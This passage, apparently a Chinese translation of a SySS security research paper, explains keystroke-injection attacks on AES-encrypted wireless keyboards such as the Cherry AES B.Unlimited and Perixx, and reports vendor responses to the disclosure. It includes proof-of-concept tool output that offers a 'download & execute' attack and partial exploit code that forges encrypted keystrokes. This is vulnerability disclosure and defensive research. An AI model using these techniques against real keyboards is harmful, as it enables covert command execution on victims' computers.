    20 * in between each packet , which is not possible when residing in "deep sleep" power save
    21 * mode.
    22 (...)
    23 */
此外，我们也阅读了SDK中的一些源码，分析了5字节的随机计数值（LS5B）的生成算法，如清单5.2所示。
    1 (...)
    2 void lib_crypt_generate_ls5b(uint8_t * dest_buf)
    3 {
    4 uint8_t i;
    5 hal_rng_power_up(true);
    6
    7 for(i=0;i<5;i++)
    8 {
    9 while(!hal_rng_data_ready ())
    10 {}
    11 dest_buf[i] = hal_rng_read();
    12 }
    13
    14 hal_rng_power_up(false);
    15 }
    16 (...)
我们还发现明文形式的按键释放报文中只包含NULL字节，比如，对我们测试的Cherry键盘而言，明文报文中只包含11个NULL字节。
因此，在无线设备所使用的计数器模式加密流程中，攻击者能够得知设备发送的按键释放报文中的几项的信息，这几项信息已在图17中用红圈标出。
对Cherry AES B.Unlimited这个设备而言，已知的问题如下所示：
1、随机数被硬编码为11个NULL字节。
2、计数器为一个5字节的随机值，这个值可以被重复使用（参考5.3节所述的重放攻击内容），并且通过ShockBurst无线通信模式以明文形式发送这个数值。
3、使用ShockBurst无线通信模式发送密文形式的按键释放报文。
4、明文形式的按键释放报文为11个NULL字节。
5、对于带有特定IV（随机值+计数器）的按键释放报文而言，其按键流（keystream）数据块为11个NULL字节（即按键释放报文的内容），因为任意x与0异或结果都为x。
因此，攻击者可以任意篡改按键释放报文，实施按键注入攻击。
为了完成攻击任务，攻击者需要知道用于发送按键信息的实际数据格式。既然攻击者可以访问设备固件，通过分析固件的实际代码或不断的试错过程，他们有可能能够找出设备实际使用的数据格式，以及需要修改哪些比特位或者字节数据才能成功完成按键注入攻击。
例如，Cherry AES B.Unlimited键盘在按键数据中使用的USB HID数据格式如图18所示。
这种USB HID数据格式所使用的修饰符及键盘代码如下所示：
使用大写字母A来进行按键注入攻击的案例如图19所示。
通常情况下，攻击者只需要经过如下5个步骤就能实施按键注入攻击：
1、找到目标设备（无线键盘）
2、找到按键释放报文（通过启发式方法）
3、做些简单的数学运算
4、发送修改过的按键释放报文，尝试按键注入
5、重复步骤3&4，直至攻击成功
在我们这个研究项目中，针对存在这类漏洞的目标设备，我们研发了几个概念验证软件来进行按键注入攻击。
使用我们的工具对Perixx键盘进行按键注入攻击的输出结果如下所示。
    1 # python keystroke_injector.py -c 6 11 28 32 39 65 75 80 -d perixx
    2 _____ ______ ___ _ _ _____ _ _
    3 | __ | ____|__ | || | | __ | | | |
    4 _ __ | |__) | |__ ) | || |_ | |__) | | __ _ _ _ ___ ___| |_
    5 | '_ | _ /| __| / /|__ _| | ___/| |/ _` | | | / __|/ _  __|
    6 | | | | |  | | / /_ | | | | | | (_| | |_| __  __/ |_
    7 |_| |_|_| __| |____| |_| |_| |_|__,_|__, |___/___|__|
    8 __/ |
    9 |___/
    10 Keystroke Injector v0.7 by Matthias Deeg - SySS GmbH (c) 2016
    11 [*] Configure nRF24 radio
    12 [*] Set keyboard: Perixx
    13 [*] Scanning for wireless keyboard ...
    14 [+] Found nRF24 device with address 15:25:D8:AB:23 on channel 65
    15 [?] Attack this device (y/n)? y
    16 [*] Search for crypto key (actually a key release packet) ...
    17 [+] Found crypto key
    18 [*] Please choose your attack vector (0 to quit)
    19 1) Open calc.exe
    20 2) Open cmd.exe
    21 3) Classic download & execute attack
    22 0) Exit
    23 [?] Select keystroke injection attack: 3
    24 [*] Start keystroke injection ...
    25 [*] Done.
我们使用自研的Cherry Attack概念验证工具对存在漏洞的Cherry键盘进行攻击，如图20所示。
如何对AES计数器模式中存在的这种加密问题加以利用呢？其实这并不是一件难事，部分利用代码如清单5.3所示。
    1 def keyCommand(self , modifiers , keycode1 , keycode2 = KEY_NONE , keycode3 = KEY_NONE , keycode4 = KEY_NONE , keycode5 = KEY_NONE , keycode6 = KEY_NONE):
    2 """ Return AES encrypted keyboard data"""
    3
    4 # generate HID keyboard data
    5 plaintext = pack("8B", modifiers , 0, keycode1 , keycode2 , keycode3 ,
    6 keycode4 , keycode5 , keycode6)
    7
    8 # encrypt the data with the set crypto key
    9 ciphertext = ""
    10 i = 0
    11for b in plaintext:
    12 ciphertext += chr(ord(b) ^ ord(self.cryptoKey[i]))
    13 i += 1
    14
    15 return ciphertext + self.counter
为了演示我们所找到的按键注入漏洞，我们搭建了一个简单的设备，名为SySS Radio Hack Box[32]，这款设备的第一个原型版本如图21所示。
这个原型设备是在树莓派的基础上搭建而成的，我们手动焊接了一个非常简单的树莓派扩展板，与带有自定义Python脚本的Crazyradio
PA搭配使用，如图22所示。
我们录制了如何使用SySS Radio Hack Box对无线设备实施按键重放注入攻击的视频，并将视频上传到YouTube网站上[33]。
**六、设备厂商的声明及反馈**
根据我们的漏洞披露计划，我们通过安全公告形式，向所有存在安全漏洞的设备所对应的厂商报告了相关的漏洞信息。
根据我们的漏洞披露策略，我们在一段时间后向公众公布了所有的安全公告[34]。
我们收到的设备厂商的声明及反馈如下文所述。
**6.1 Perixx**
对于Perixx PERIDUO-710W桌面无线设备中存在的安全问题，Perixx没有任何反馈信息。
**6.2 Microsoft**
对于Microsoft Wireless Desktop 2000中代码及数据缺乏安全防护的问题，微软的反馈信息如下：
“根据您在邮件里提供的信息，由于每个桌面无线设备所使用的加密密钥都不相同，因此这种攻击不具备普遍性。此外攻击需要物理接触键盘，同时还需要嗅探数据报文才能使用窃取的密钥来解密数据。如果攻击者可以打开键盘，导出闪存数据，攻击者同样也能够修改整个键盘。因此，这个漏洞不符合漏洞安全服务标准。我们会将这个问题提交给核心团队，评估是否需要在本产品的下个版本进行修改。”
对于鼠标欺骗攻击而言，微软的声明如下：
“这种行为符合我们的产品设计方案，因此我们不会对这个产品发布安全更新。”
对于重放攻击而言，微软的声明如下：
“我们正在验证对这个问题的修复措施是否能够生效，希望能够通过修复措施解决这一问题。由于这个问题存在于USB设备的固件中，我们仍在研究是否只能在后续生产的USB设备中解决这一问题，还是可以通过某种办法解决存在这一问题的所有USB设备。“
**6.3 Logitech**
对于Logitech MK520设备而言，罗技的反馈如下：
“非常感谢安全团队对这一产品的重视，请相信罗技会在未来的产品中提供更为安全的加密方案。“
**6.4 Fujitsu**
对于我们在Fujitsu LX901无线键盘中发现的重放攻击问题，富士通的反馈如下：
“非常感谢您对我们无线键盘安全问题的通知。正如我们前面提到过的那样，根据设备所使用的无线协议，您描述的攻击场景在现实生活中难以具体操作。我们销售产品的重点不是在于产品安全性上，而在于产品的易用性上（保证未加密的无线键盘不存在重大安全缺陷即可）。我们将在后续产品中考虑您提出的任何新意见
。“
**6.5 Cherry**
对于我们在Cherry AES B.Unlimited中发现的安全漏洞，Chery的声明如下：
“我们已经检查了您提交的‘安全漏洞’。我们决定未来在推广这个产品时，不再提及AES加密机制。目前，我们正在研究一款后续产品。正如我们一贯强调的那样，如果我们的客户在安全性上要求较高，我们推荐他们使用通过CC认证的有线产品。“
**七、总结**
在整个研究项目中，使用AES加密算法的5个现代桌面无线设备都存在安全漏洞。
总的来说，我们发现了5类安全问题，可以用于实施特定的攻击：
1、对代码（固件）及数据（加密密钥）保护不足
导致攻击者能够访问敏感数据。
2、通信数据没有经过加密或者认证
导致攻击者能够实施鼠标欺骗攻击。
3、缺乏防御重放攻击的保护机制
导致攻击者能够实施重放攻击。
4、对重放攻击保护不到位